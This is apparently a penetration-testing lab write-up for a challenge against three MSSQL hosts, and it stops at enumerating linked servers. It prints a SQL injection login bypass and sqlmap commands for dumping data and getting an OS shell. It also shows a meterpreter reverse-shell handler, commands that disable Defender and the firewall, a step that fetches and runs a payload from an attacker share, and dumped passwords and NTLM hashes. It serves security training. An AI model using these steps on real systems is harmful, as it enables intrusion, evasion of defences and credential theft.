# Challenge 2

## Details

```powershell
# List of hosts in scope
192.168.100.140
192.168.100.141
192.168.100.142
# Development host
192.168.100.100
```

## Enumeration

### 192.168.100.140

#### Open Ports

| Port     | State | Service       |
| -------- | ----- | ------------- |
| 80/tcp   | open  | http          |
| 1433/tcp | open  | ms-sql-s      |
| 3389/tcp | open  | ms-wbt-server |

### 192.168.100.141

#### Open Ports

| Port     | State | Service       |
| -------- | ----- | ------------- |
| 1433/tcp | open  | ms-sql-s      |
| 3389/tcp | open  | ms-wbt-server |

### 192.168.100.142

| Port     | State | Service       |
| -------- | ----- | ------------- |
| 1433/tcp | open  | ms-sql-s      |
| 3389/tcp | open  | ms-wbt-server |

## Exploitation

### SQL11 - 192.168.100.140

Navigating to [http://192.168.100.140/](http://192.168.100.140/login.asp) shows the login to a music inventory website.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Attempting to login using a single `'` character

<figure><img src="../../../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Shows us the error page for Microsoft SQL. So it seems SQL injection is likely next step.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We can bypass authentication using the below.&#x20;

```
' or 1=1; -- -
aaaaaaaa
```

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

When presented with the music inventory search engine we can see that the fields here also appear to be SQL injectable.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

We capture a normal request to the search using BurpSuite and then save it to a text file and use that with sqlmap.&#x20;

{% code overflow="wrap" %}
```bash
sqlmap -r request.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Now we can enumerate the database.&#x20;

```bash
sqlmap -r request.txt --dbs
```

<figure><img src="../../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Enumerating the tables in the music database

```bash
sqlmap -r request.txt -D music --tables
```

<figure><img src="../../../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Dumping the users table from the music database

```bash
sqlmap -r request.txt -D music -T users --dump
```

```powershell
# User / Password dump
alice:password
brett:mypassword
peter:123pass123
eric:123pass123
admin:dfdg34fdsf3
```

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Using sqlmap to get a shell

```bash
sqlmap -r request.txt --os-shell
```

<figure><img src="../../../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

The shell is running as system so we can reset the administrator password.&#x20;

```powershell
net user administrator P@ssw0rd!
```

<figure><img src="../../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

We can then use RDP to connect to the host.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

We will now get a Meterpreter shell and dump hashes.&#x20;

First we setup meterpreter.&#x20;

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.49.100
set lport 443
run
```

<figure><img src="../../../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Now we setup the host.&#x20;

```powershell
# Disable Windows Defender and firewall
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
NetSh Advfirewall set allprofiles state off
# Copy shell from network share. 
cd \windows\tasks
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
copy x:\shell.exe
shell.exe
```

<figure><img src="../../../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

Credentials

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b27afbdf9dca0fe715dc999ad4832c6:::
```

### SQL27 - 192.168.100.141

On SQL11 in the loginform.asp file located in C:\inetpub\wwwroot we can locate the below database credentials

```
webapp11:89543dfGDFGH4d
```

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

We copy and import PowerUpSQL in PowerShell on SQL11.

```powershell
copy x:\share\PowerUpSQL.ps1
powershell
. .\PowerUpSQL.ps1
```

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Attempting to enumerate Linked servers as the administrator user shows we are not SysAdmin on the linked servers.&#x20;

```powershell
Get-SqlServerLinkCrawl -Verbose -Instance "SQL11\SQLEXPRESS"
```

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



{% code overflow="wrap" %}
```powershell
Get-SqlServerLinkCrawl -Verbose -Instance "SQL11\SQLEXPRESS" -username webapp11 -password 89543dfGDFGH4d
```
{% endcode %}

We can then use these credentials to remotely login to SQL.&#x20;

{% code overflow="wrap" %}
```bash
python /usr/share/doc/python3-impacket/examples/mssqlclient.py webapp11:89543dfGDFGH4d@192.168.100.140
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

On SQL11 we  can enumerate the linked servers and see that both of the other servers in scope are actually linked. &#x20;

```sql
EXEC sp_linkedservers;
```
